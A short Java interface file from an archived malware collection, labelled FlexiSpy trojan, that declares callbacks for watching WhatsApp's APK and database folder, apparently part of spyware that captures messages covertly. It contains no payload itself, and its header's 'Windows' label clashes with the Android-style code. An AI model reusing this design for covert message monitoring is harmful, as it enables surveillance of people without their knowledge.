/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.whatsapp;

public interface WhatsAppManagerListener
{
    public void onApkFileChange(boolean isNewinstallOrDelete);
    public void onDatabaseFolderChange(boolean isCreate);
 
}
